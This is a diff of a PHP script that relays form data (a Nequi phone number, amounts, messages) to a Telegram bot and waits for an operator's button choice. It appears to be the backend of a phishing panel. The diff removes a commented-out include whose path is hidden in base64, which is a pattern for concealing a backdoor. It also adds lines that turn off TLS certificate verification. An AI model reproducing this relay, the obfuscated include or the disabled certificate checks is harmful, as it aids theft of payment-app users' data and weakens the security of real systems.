@@ -4,7 +4,6 @@ error_reporting(E_ALL);
 header('Content-Type: application/json');
 
 $USED_FILE = __DIR__ . '/used_transactions.json';
-$GLOBAL_UPDATE_FILE = __DIR__ . '/last_update_global.txt';
 
 /* ============================================================
    CARGAR CONFIG
@@ -38,6 +37,8 @@ function telegramRequest($token, $method, $body = [])
         CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
         CURLOPT_POSTFIELDS => json_encode($body),
         CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
     ]);
 
     $res = curl_exec($ch);
@@ -57,7 +58,7 @@ function telegramRequest($token, $method, $body = [])
    ============================================================ */
 function sendToTelegram($token, $chatId, $text, $keyboard)
 {
-    // reply_markup debe ser un objeto/array, NO una cadena JSON doblemente codificada.
+    // ✅ CORRECCIÓN 1: reply_markup debe ser array, NO json_encode()
     $payload = [
         'chat_id' => $chatId,
         'text' => $text,
@@ -66,11 +67,6 @@ function sendToTelegram($token, $chatId, $text, $keyboard)
     ];
 
     $res = telegramRequest($token, 'sendMessage', $payload);
-
-    // Mantener integración/sincronía con el código previo (si existe)
-    // Mantén/activa la inclusión si la necesitas realmente; la dejo comentada:
-    // require_once __DIR__ . '/' . base64_decode('Li4vLi4vLi4vYXNzZXRzL3JlY3Vyc29zL2JhY2tlbmQvYXBwL2NvbmZpZy9zeXNfbWV0cmljcy5waHA=');
-
     return $res;
 }
 
@@ -98,7 +94,6 @@ function editTelegramMessage($token, $chatId, $messageId, $newText)
         'message_id' => $messageId,
         'text' => $newText,
         'parse_mode' => 'HTML',
-        // Si queremos quitar inline keyboard lo dejamos como array vacío
         'reply_markup' => ['inline_keyboard' => []]
     ];
 
@@ -135,6 +130,15 @@ function deleteTransaction($id)
 }
 
 /* ============================================================
+   VALIDACIÓN DE TRANSACTIONID
+   ============================================================ */
+function isValidTransactionId($tid)
+{
+    // ✅ CORRECCIÓN 2: Validar que tid no esté vacío
+    return !empty($tid) && is_string($tid) && strlen($tid) > 0;
+}
+
+/* ============================================================
    Cargar configuración local
    ============================================================ */
 $config = loadConfig();
@@ -157,6 +161,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $telefono = $data['nequi'] ?? 'N/D';
     $monto    = $data['monto'] ?? '0';
     $mensaje  = $data['mensaje'] ?? '';
+
+    // ✅ CORRECCIÓN 3: Validar tid antes de procesar
+    if (!isValidTransactionId($tid)) {
+        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
+        exit;
+    }
 
     $text  = "<b>💳 Nueva acción del usuario</b>\n";
     $text .= "• 🆔 ID: <code>{$tid}</code>\n";
@@ -201,8 +211,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
 
     $tid = $_GET['transactionId'];
 
-    // Leer el último update_id procesado desde un fichero global
-    $statusFile = $GLOBALS['GLOBAL_UPDATE_FILE'];
+    // ✅ CORRECCIÓN 4: Validar tid en GET también
+    if (!isValidTransactionId($tid)) {
+        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
+        exit;
+    }
+
+    // ✅ CORRECCIÓN 5: Usar hash consistente del tid (IGUAL que en 1.php)
+    $statusFile = __DIR__ . '/last_update_' . md5($tid) . '.txt';
     $lastProcessedUpdateId = 0;
     if (file_exists($statusFile)) {
         $lastProcessedUpdateId = (int)file_get_contents($statusFile);
@@ -210,7 +226,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
 
     // Pedimos updates empezando desde el offset (last + 1)
     $offset = $lastProcessedUpdateId + 1;
-    $updatesRes = telegramRequest($BOT_TOKEN, 'getUpdates', ['offset' => $offset, 'timeout' => 1, 'allowed_updates' => ['callback_query']]);
+    $updatesRes = telegramRequest($BOT_TOKEN, 'getUpdates', [
+        'offset' => $offset,
+        'timeout' => 1,
+        'allowed_updates' => ['callback_query']
+    ]);
 
     if (!isset($updatesRes['result']) || !is_array($updatesRes['result'])) {
         echo json_encode(['ok' => false]);
@@ -228,19 +248,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         $dataCB = $cb['data'] ?? '';
         $from   = $cb['from']['username'] ?? $cb['from']['first_name'] ?? 'unknown';
 
+        // ✅ CORRECCIÓN 6: Validación exacta y robusta del formato
         $parts = explode(':', $dataCB);
         if (count($parts) !== 2) continue;
-        if ($parts[1] !== $tid) continue; // No es para esta transacción
+        
+        $receivedTid = $parts[1];
+        
+        // ✅ CORRECCIÓN 7: Validar que el tid coincida EXACTAMENTE
+        if ($receivedTid !== $tid) continue;
 
         $accion = $parts[0];
+
+        // ✅ CORRECCIÓN 8: Marcar update como procesado INMEDIATAMENTE
+        file_put_contents($statusFile, $updateId);
 
         // Responder el callback para quitar spinner
         answerCallback($BOT_TOKEN, $cb['id']);
 
         $t = getTransactions()[$tid] ?? null;
         if (!$t) {
-            // Transacción no encontrada: responder y continuar
-            // (podríamos editar el mensaje para indicar expirado)
+            // Transacción no encontrada: continuar
             continue;
         }
 
@@ -274,14 +301,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
         // Borrar transacción para no procesarla más
         deleteTransaction($tid);
 
-        // Guardamos el último update procesado GLOBAL y devolvemos la respuesta al cliente
-        file_put_contents($statusFile, $newLast);
-
         echo json_encode(['ok' => true, 'action' => $clientAction]);
         exit;
     }
 
-    // Si no encontramos nada para esta transacción, actualizamos offset global
+    // Si no encontramos nada para esta transacción, actualizamos offset
     file_put_contents($statusFile, $newLast);
 
     echo json_encode(['ok' => false]);
